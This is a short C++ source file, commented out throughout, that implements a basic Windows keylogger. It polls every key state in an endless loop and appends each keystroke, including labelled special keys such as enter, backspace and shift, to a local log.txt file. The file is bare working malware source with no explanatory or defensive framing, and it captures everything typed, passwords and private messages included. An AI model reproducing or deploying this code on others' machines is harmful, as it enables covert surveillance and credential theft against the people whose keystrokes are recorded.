// #include <iostream>
// #include <windows.h>
// #include <winuser.h>
// #include <fstream>
// using namespace std;

// void startLogging();

// int main() {
//     startLogging();
// }

// void startLogging() {
//     char c;
//     ofstream log("log.txt", ios::app);  // Open the log file once

//     while (true) {
//         Sleep(10);  // Reduce CPU usage
//         for (c = 0; c <= 254; c++) {
//             if (GetAsyncKeyState(c) & 0x1) {
//                 switch (c) {
//                     case VK_BACK:
//                         log << "[backspace]";
//                         break;
//                     case VK_RETURN:
//                         log << "[enter]";
//                         break;
//                     case VK_SHIFT:
//                         log << "[shift]";
//                         break;
//                     case VK_CONTROL:
//                         log << "[control]";
//                         break;
//                     case VK_CAPITAL:
//                         log << "[caps lock]";
//                         break;
//                     case VK_TAB:
//                         log << "[tab]";
//                         break;
//                     case VK_MENU:
//                         log << "[alt]";
//                         break;
//                     case VK_LBUTTON:
//                     case VK_RBUTTON:
//                         break;  // Ignore mouse clicks
//                     default:
//                         log << c;
//                 }
//                 log.flush();  // Ensure data is written immediately
//             }
//         }
//     }
// }
